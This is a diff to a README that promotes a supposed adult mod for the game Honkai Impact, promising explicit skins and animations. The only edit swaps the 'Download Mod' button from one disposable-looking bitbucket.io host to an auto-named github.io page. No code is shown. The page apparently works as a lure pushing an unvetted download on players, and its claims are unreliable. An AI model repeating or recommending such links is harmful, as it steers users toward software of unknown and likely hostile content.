@@ -2,7 +2,7 @@
 
 **Want to spice up your Honkai Impact gameplay with adult content and exclusive NSFW visuals?** The Honkai Impact Adult Mod is your ultimate patch for unlocking lewd skins, explicit character models, and jaw-dropping animations that are *definitely not safe for work*. Perfect for players who want more than just action—this mod gives you eye-candy and then some.
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload20.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://Honkai-Impact-Adult-Mod-rawaf.github.io/.github)
 ---
 
 ## 🧩 What is the Honkai Impact Adult Mod?
